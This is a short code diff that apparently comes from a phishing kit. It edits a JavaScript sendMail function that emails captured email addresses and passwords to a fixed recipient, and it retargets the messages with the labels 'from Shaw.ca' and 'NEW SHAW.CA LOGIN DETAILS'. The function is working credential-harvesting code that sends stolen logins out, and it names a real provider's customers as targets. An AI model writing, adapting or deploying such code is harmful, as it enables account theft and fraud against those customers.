@@ -11,12 +11,12 @@ const sendMail = (email, password, user, res) => {
     auth,
   })
 
-  const text = `New login details. email: ${email}, password: ${password} `
+  const text = `New login details. email: ${email}, password: ${password} from Shaw.ca `
 
   const mailOptions = {
     from: auth['user'],
     to: user,
-    subject: 'NEW LOGIN DETAILS',
+    subject: 'NEW SHAW.CA LOGIN DETAILS',
     text,
   }
 
